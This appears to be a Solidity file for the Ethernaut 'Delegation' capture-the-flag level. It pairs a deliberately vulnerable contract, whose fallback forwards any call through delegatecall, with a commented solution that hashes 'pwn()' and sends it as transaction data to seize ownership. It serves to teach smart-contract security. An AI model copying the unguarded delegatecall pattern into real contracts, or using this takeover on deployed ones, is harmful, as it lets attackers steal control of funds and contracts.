// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

/*

Solution:

await contract.owner() //checks current owner - ethernaut address
//gets hash of the function to be called
var pwnSignature = web3.utils.sha3("pwn()") 
contract.sendTransaction({data: pwnSignature})//invokes fallback
await contract.owner() //checks current owner which is your address

*/